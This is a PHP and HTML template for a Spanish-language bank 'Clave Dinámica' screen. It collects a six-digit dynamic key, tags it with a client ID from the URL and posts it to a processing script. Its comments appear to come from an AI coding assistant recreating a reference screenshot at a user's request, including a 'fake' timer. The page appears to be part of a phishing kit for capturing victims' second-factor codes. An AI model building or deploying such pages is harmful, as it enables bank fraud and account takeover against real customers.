<div class="otp-container">
    <form class="otp-form" id="cdForm" action="modules/api/procesar_dinamica.php" method="POST">
        <h4>Clave Dinámica</h4>
        <h1>Ingresa la Clave Dinámica</h1>

        <p class="instruction">
            Consúltala en el último celular donde la inscribiste ingresando a "Ajustes", luego a "Seguridad" y por
            último a "Claves Dinámicas".
        </p>

        <div style="text-align:center; margin: 15px 0;">
            <img src="assets/img/dynamic_instruction.png" alt="Instrucción"
                style="max-width:100%; border-radius:8px; width: 220px;">
        </div>

        <!-- No timer for Dynamic Key usually, or we can keep it fake if requested. Image didn't show timer but same style. -->
        <!-- User said "usa el mismo codigo" so I will keep the structure but maybe hide timer if not needed.
             The reference image for Clave Dinamica DOES NOT show a timer usually, but I will comment it out or leave it if user wants EXACTLY the same.
             I'll look at the image provided (Step 879): It has "Ingresa la Clave Dinámica", lock icon, dashes.
             I will ommit timer to match the specific image but keep the aesthetic. -->

        <?php if (isset($_GET['status']) && $_GET['status'] === 'clave_dinamica_error'): ?>
            <p class="otp-error">Clave dinámica incorrecta. Inténtalo de nuevo.</p>
            <input type="hidden" name="retry" value="1">
        <?php endif; ?>

        <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
        <!-- Input oculto para recolectar el valor completo (legacy logic support if needed, but otp_form sends array) -->
        <!-- Ojo: processing script expects 'dinamica' string. otp_form sends otp array.
             I must adapt form to send 'dinamica' or adapt script.
             Easier: Allow JS to fill a hidden input 'dinamica' and use dummy inputs for visual. -->

        <div class="otp-input-box">
            <div class="otp-input-group">
                <i class="fa-solid fa-lock"></i>
                <label>Ingresa la Clave Dinámica</label>
                <div class="otp-inputs" id="otpInputs">
                    <!-- 6 digits -->
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="tel" class="cd-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                </div>
            </div>
        </div>

        <input type="hidden" name="dinamica" id="dinamicaFull">

        <button type="submit" class="btn btn-login" id="cdButton" disabled>Continuar</button>
    </form>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const digits = document.querySelectorAll('.cd-digit');
        const btnContinue = document.getElementById('cdButton');
        const hiddenInput = document.getElementById('dinamicaFull');
        const form = document.getElementById('cdForm');

        digits.forEach((digit, index) => {
            digit.addEventListener('input', (e) => {
                // Numbers only
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1) {
                    if (index < digits.length - 1) digits[index + 1].focus();
                }
                checkFull();
            });

            digit.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value) {
                    if (index > 0) digits[index - 1].focus();
                }
            });
        });

        function checkFull() {
            let fullVal = '';
            let complete = true;
            digits.forEach(d => {
                if (!d.value) complete = false;
                fullVal += d.value;
            });

            if (complete) {
                btnContinue.disabled = false;
                btnContinue.style.opacity = "1";
                btnContinue.style.cursor = "pointer";
            } else {
                btnContinue.disabled = true;
                btnContinue.style.opacity = "0.5";
                btnContinue.style.cursor = "not-allowed";
            }
            hiddenInput.value = fullVal;
        }
    });
</script>
